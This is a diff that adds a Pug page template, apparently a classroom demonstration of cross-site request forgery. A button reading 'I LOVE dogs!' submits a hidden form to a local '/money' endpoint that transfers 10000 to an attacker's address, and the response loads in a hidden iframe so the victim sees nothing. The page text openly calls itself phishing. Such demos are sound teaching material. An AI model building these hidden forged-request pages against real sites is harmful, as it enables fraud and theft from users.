@@ -1,0 +1,18 @@
+extends layout.pug
+
+mixin dog_form
+  form(method='post', action='http://localhost:3000/money', target='sneaky')
+    input(type='hidden', name='dest' value='bad.dude@ilovetohack.com')
+    input(type='hidden', name='amount' value='10000')
+    button.btn.btn-success#dog-btn(type='submit')
+      i.fa.fa-heart
+      span &nbsp; I LOVE dogs!
+
+block content
+  p
+    | Hello, dog lover! | I'm busy phishing you! 
+    | But I know you really love dogs so you will fall for my scheme! :D
+  div
+    +dog_form
+  p.mt-3#response
+  iframe(name='sneaky', hidden)
